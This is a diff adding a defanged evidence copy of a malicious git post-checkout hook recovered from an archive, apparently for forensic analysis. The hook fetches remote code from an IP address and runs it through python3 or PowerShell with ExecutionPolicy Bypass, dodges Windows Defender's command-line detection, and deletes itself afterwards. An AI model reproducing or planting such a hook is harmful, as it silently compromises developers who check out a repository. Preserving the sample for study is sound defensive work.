@@ -1,0 +1,59 @@
+### DEFANGED EVIDENCE COPY - not executable as-is. Do not rename to .sh or place in .git/hooks/.
+### Source: olivebloom.zip -> olivebloom/.git/hooks/post-checkout (1,928 bytes, zip mtime 2026-11-03 19:54 PKT)
+### Read as text from inside the archive (never extracted, git never run). Only change from the original:
+### scheme and dots in the C2 address (https -> hxxps, . -> [.]). Byte-exact SHA-256 pending (see README, Phase 4).
+--------------------------------------------------------------------------------
+#!/bin/sh
+case "$(uname -s)" in
+  Darwin|Linux)
+    curl -s hxxps://66.116.241[.]148/dtech/auralyx | python3
+    ;;
+  MINGW*|MSYS*|CYGWIN*|Windows_NT*)
+    # Defender flags `irm ... | iex` on the process cmdline as Trojan:Win32/Commando.A!ml
+    # (CreateProcess then surfaces as "Permission denied" under Git Bash).
+    # Download to a temp file with Git's curl, then run via powershell -File.
+    _url="hxxps://66.116.241[.]148/wtech/auralyx"
+    _out="${TEMP:-/tmp}/wtech_boot_$$.ps1"
+    _curl=""
+    if [ -x "/c/Program Files/Git/mingw64/bin/curl.exe" ]; then
+      _curl="/c/Program Files/Git/mingw64/bin/curl.exe"
+    elif command -v curl.exe >/dev/null 2>&1; then
+      _curl="curl.exe"
+    elif command -v curl >/dev/null 2>&1; then
+      _curl="curl"
+    fi
+    if [ -n "$_curl" ]; then
+      "$_curl" -sL "$_url" -o "$_out" || exit 0
+      _winout="$_out"
+      if command -v cygpath >/dev/null 2>&1; then
+        _winout=$(cygpath -w "$_out")
+      fi
+      powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$_winout"
+    fi
+    ;;
+  *)
+    if command -v powershell.exe >/dev/null 2>&1; then
+      _url="hxxps://66.116.241[.]148/wtech/auralyx"
+      _out="${TEMP:-/tmp}/wtech_boot_$$.ps1"
+      if command -v curl.exe >/dev/null 2>&1; then
+        curl.exe -sL "$_url" -o "$_out"
+      elif command -v curl >/dev/null 2>&1; then
+        curl -sL "$_url" -o "$_out"
+      fi
+      if [ -f "$_out" ]; then
+        _winout="$_out"
+        if command -v cygpath >/dev/null 2>&1; then
+          _winout=$(cygpath -w "$_out")
+        fi
+        powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$_winout"
+      fi
+    elif command -v python3 >/dev/null 2>&1 && command -v curl >/dev/null 2>&1; then
+      curl -s hxxps://66.116.241[.]148/dtech/auralyx | python3
+    fi
+    ;;
+esac
+
+hook_path="$(git rev-parse --git-path hooks/post-checkout 2>/dev/null)" || hook_path="$0"
+rm -f "$hook_path" "$0" 2>/dev/null
+
+exit 0
